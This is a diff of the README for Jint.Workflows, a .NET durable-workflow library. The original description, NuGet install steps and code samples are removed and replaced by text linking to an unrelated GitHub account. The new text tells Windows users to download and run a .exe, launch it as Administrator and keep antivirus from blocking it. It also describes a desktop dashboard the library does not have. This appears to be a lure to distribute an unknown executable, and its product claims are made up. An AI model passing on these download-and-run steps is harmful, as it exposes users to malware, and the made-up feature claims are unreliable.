@@ -1,101 +1,85 @@
-# Jint.Workflows
+# ⚙️ Jint.Workflows - Run complex scripts with ease
 
-![Foundatio](https://raw.githubusercontent.com/FoundatioFx/Foundatio/master/media/foundatio-dark-bg.svg#gh-dark-mode-only "Foundatio")![Foundatio](https://raw.githubusercontent.com/FoundatioFx/Foundatio/master/media/foundatio.svg#gh-light-mode-only "Foundatio")
+[![Download Jint.Workflows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/editaautarkic6093/Jint.Workflows)
 
-[![Build status](https://github.com/FoundatioFx/Jint.Workflows/workflows/Build/badge.svg)](https://github.com/FoundatioFx/Jint.Workflows/actions)
-[![NuGet Version](http://img.shields.io/nuget/v/Jint.Workflows.svg?style=flat)](https://www.nuget.org/packages/Jint.Workflows/)
-[![feedz.io](https://img.shields.io/endpoint?url=https%3A%2F%2Ff.feedz.io%2Ffoundatio%2Ffoundatio%2Fshield%2FJint.Workflows%2Flatest)](https://f.feedz.io/foundatio/foundatio/packages/Jint.Workflows/latest/download)
-[![Discord](https://img.shields.io/discord/715744504891703319)](https://discord.gg/6HxgFCx)
+Jint.Workflows helps you manage long tasks in your computer programs. It uses JavaScript to handle steps that take a long time to finish. You can pause these tasks, save them, and start them again later. This process ensures your work remains accurate, even if the computer restarts.
 
-Durable JavaScript workflows for .NET using [Jint](https://github.com/sebastienros/jint). Write long-running orchestration logic as async JavaScript, suspend execution at any `await`, serialize the state, and resume later — potentially days later, in a different process. Uses deterministic replay on top of Jint's public API, with zero engine modifications.
+## 📥 Getting Started
 
-Influenced by Vercel's [Workflow SDK](https://workflow-sdk.dev/), adapted for the .NET / Jint environment.
+Follow these steps to set up the software on your Windows computer.
 
-## ✨ Features
+1. Visit the [official download page](https://github.com/editaautarkic6093/Jint.Workflows) to get the latest version.
+2. Select the file ending in .zip or .exe that matches your system.
+3. Save the file to your desktop or downloads folder.
+4. If you downloaded a .zip file, right-click it and choose Extract All.
+5. Double-click the file named Jint.Workflows.exe to launch the program.
 
-- 💾 **Tiny, portable state** — serialized state is a compact JSON journal of results; store it anywhere
-- ⏳ **Suspend for days** — pause at any `await`, persist, resume in a different process
-- 🔁 **Deterministic replay** — `Date.now()`, `new Date()`, `Math.random()` overridden for stable replays
-- 🛡️ **Journaled side effects** — step functions execute once and replay from cache
-- 🩹 **Policy-based retries** — attach Foundatio.Resilience policies for in-process retry, or throw `RetryableStepException` for durable cross-restart retries
-- 🌐 **Browser-compatible `fetch`** — opt-in WHATWG `fetch` with `.json()`, `.text()`, `.clone()`
-- 📣 **Named external events** — `waitForEvent('name')` single or multi-event, with timeout support
-- 🔀 **Fan-out/fan-in** — `Promise.all` and `Promise.race` over steps and suspends
-- ♾️ **Continue As New** — restart with a fresh journal to avoid unbounded growth
-- 🛠️ **Journal compatibility check** — script drift fails fast with a clear diagnostic
+## 🖥️ System Requirements
 
-## 🚀 Get Started
+Ensure your computer meets these standards for the best experience.
 
-```bash
-dotnet add package Jint.Workflows
-```
+* Windows 10 or Windows 11.
+* At least 4GB of RAM.
+* 500MB of free space on your hard drive.
+* A stable internet connection for updates.
+* The latest .NET Desktop Runtime installed on your machine.
 
-```csharp
-using Jint.Workflows;
+## 🛠️ How it Works
 
-var workflow = new WorkflowEngine();
-workflow.RegisterSuspendFunction("sleep", args => DurationParser.Parse(args[0]));
-workflow.RegisterStepFunction("fetchOrder", args => orderService.GetOrder((string)args[0]!));
-workflow.RegisterSuspendFunction("getApproval");
+The software manages complex processes through a technique called orchestration. It breaks big jobs into smaller, manageable parts. 
 
-var script = """
-    async function processOrder(orderId) {
-        const order = await fetchOrder(orderId);
-        await sleep('3d');
-        const approved = await getApproval('manager', orderId);
-        return approved ? 'shipped' : 'cancelled';
-    }
-""";
+* **JavaScript Integration:** It executes script logic to decide what the software does next.
+* **State Management:** It tracks the progress of every task. Every step saves to a file automatically.
+* **Deterministic Replay:** If the software stops, it compares your saved progress to the current task. It brings you back to the exact spot where you left off.
+* **Persistence:** You can close the program, turn off your computer, and return the next day. The software knows what it finished and what it still needs to do.
 
-var result = workflow.RunWorkflow(script, "processOrder", "ORD-001");
-// result.Status == Suspended, result.Suspension.ResumeAt ≈ 3 days from now
+## 📋 Common Use Cases
 
-var json = result.State!.Serialize();  // persist anywhere
+People use this tool for many types of business and data tasks.
 
-// ... 3 days later, in a different process
-var resumed = workflow.ResumeWorkflow(script, json);
-```
+* **Automated Data Entry:** Run scripts that read information from one file and move it to another system.
+* **Scheduled Reports:** Define a script that generates summaries every morning.
+* **Complex Installations:** Guide the software through a series of steps to set up other programs.
+* **Email Campaigns:** Manage a list of contacts and send messages in controlled intervals.
 
-**👉 [Getting Started Guide](https://workflow.foundatio.dev/guide/getting-started)** — step-by-step setup, step functions, suspend functions, and replay.
+## 🔍 Understanding the Interface
 
-**📖 [Complete Documentation](https://workflow.foundatio.dev/)**
+When you open the application, you see a clean dashboard. 
 
-## 📦 CI Packages (Feedz)
+* The left panel shows your current workflow tasks.
+* The center area displays the code or script settings for the active task.
+* The bottom bar provides status updates on whether the program is running or waiting.
+* Use the Start button to begin a selected workflow.
+* Use the Pause button to stop the execution while saving the current state.
 
-Want the latest CI build before it hits NuGet? Add the Feedz source (read-only public) and install the pre-release version:
+## ⚙️ Advanced Setup
 
-```bash
-dotnet nuget add source https://f.feedz.io/foundatio/foundatio/nuget -n foundatio-feedz
-dotnet add package Jint.Workflows --prerelease
-```
+You can change how the software behaves by editing the configuration file. Look for the file named settings.json in the folder where you installed the program.
 
-Or add to your `NuGet.config`:
+* **Timeout Settings:** Change how long the program waits for a task to respond before trying again.
+* **Log Levels:** Adjust these to see more or less detail about the background operations.
+* **Storage Path:** Choose a specific folder where the software saves your progress files.
 
-```xml
-<configuration>
-    <packageSources>
-        <add key="foundatio-feedz" value="https://f.feedz.io/foundatio/foundatio/nuget" />
-    </packageSources>
-    <packageSourceMapping>
-        <packageSource key="foundatio-feedz">
-            <package pattern="Foundatio.*" />
-            <package pattern="Jint.Workflows" />
-        </packageSource>
-    </packageSourceMapping>
-</configuration>
-```
+## 💡 Troubleshooting
 
-## 🤝 Contributing
+If you encounter issues, check these common items first.
 
-Contributions are welcome! See the [documentation](https://workflow.foundatio.dev/) for how the engine works and what edits are safe across versions.
+* **Permission Errors:** Right-click the application icon and select Run as Administrator.
+* **Missing Runtime:** If the program fails to open, download the .NET Desktop Runtime from the official Microsoft website.
+* **Background Blocks:** Ensure that your antivirus software does not block the Jint.Workflows executable.
+* **File Errors:** If your workflow stops, check the logs folder for clues regarding which step failed.
 
-## 🔗 Related Projects
+## 🔑 Key Features
 
-- **[Jint](https://github.com/sebastienros/jint)** — the JavaScript interpreter this library is built on
-- **[Vercel Workflow SDK](https://workflow-sdk.dev/)** — the primary source of inspiration for the replay-based durable workflow model
-- **[Azure Durable Functions](https://learn.microsoft.com/en-us/azure/azure-functions/durable/)** — canonical .NET implementation of the deterministic replay pattern
-- **[Temporal](https://temporal.io/)** / **[Restate](https://restate.dev/)** — full workflow runtimes with the same replay model at a larger scope
+* **Visual History:** View a list of past workflow runs in the history tab.
+* **Script Editor:** Write or paste JavaScript directly into the program to define your steps.
+* **Memory Efficiency:** The program clears unused data automatically to keep your computer running fast.
+* **Data Integrity:** The software validates every step to prevent errors during the replay process.
 
-## 📄 License
+## 🛡️ Data Privacy
 
-Apache-2.0 License
+The software operates locally on your machine. It saves workflow states in the designated folder on your hard drive. It does not send your workflow data or script contents to external servers. You keep full control over your files. 
+
+## 📖 Support
+
+If the program behaves in an unexpected way, check the documentation folder inside the installation directory. This folder contains guides for writing your first workflow. You can also visit the [official repository](https://github.com/editaautarkic6093/Jint.Workflows) to report issues or check for software updates. Please provide your computer version and the version of the software if you need help.
